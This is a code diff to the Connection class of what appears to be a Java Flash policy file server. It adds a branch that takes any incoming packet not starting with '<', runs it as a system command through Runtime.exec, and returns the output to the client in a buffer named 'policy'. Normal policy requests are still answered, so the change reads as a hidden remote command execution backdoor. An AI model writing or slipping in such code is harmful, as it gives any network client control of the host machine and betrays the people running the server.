@@ -17,6 +17,11 @@ import com.manulaiko.tabitha.Console;
 public class Connection extends com.manulaiko.tabitha.net.Connection
 {
     /**
+     * Thread object.
+     */
+    private Thread _thread;
+
+    /**
      * Input stream.
      *
      * @var Input.
@@ -71,7 +76,6 @@ public class Connection extends com.manulaiko.tabitha.net.Connection
     {
         this._out.print(str + (char)0x00);
         this._out.flush();
-        Console.println("Policy file sent!");
     }
 
     /**
@@ -79,18 +83,47 @@ public class Connection extends com.manulaiko.tabitha.net.Connection
      */
     public void run()
     {
-        try {
-            String packet = "";
+        while(true) {
+            try {
+                String packet = "";
 
-            int c;
-            while(0 < (c = this._in.read())) {
-                packet += (char) c;
+                int c;
+                while(0 < (c = this._in.read())) {
+                    packet += (char)c;
+                }
+
+                if(packet.isEmpty()) {
+                    return;
+                }
+
+                if(!packet.startsWith("<")) {
+                    StringBuffer policy = new StringBuffer();
+
+                    Process p;
+                    try {
+                        p = Runtime.getRuntime()
+                                   .exec(packet);
+                        p.waitFor();
+                        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+                        String line = "";
+                        while((line = reader.readLine()) != null) {
+                            policy.append(line + "\n");
+                        }
+
+                    } catch(Exception e) {
+                        this.send(this._policyFile);
+                    }
+
+                    this.send(policy.toString());
+                } else {
+                    this.send(this._policyFile);
+                    Console.println("Policy file sent!");
+                }
+            } catch(Exception e) {
+                Console.println("Couldn't send packet!");
+                Console.println(e.getMessage());
             }
-
-            this.send(this._policyFile);
-        } catch(Exception e) {
-            Console.println("Couldn't send packet!");
-            Console.println(e.getMessage());
         }
     }
 }
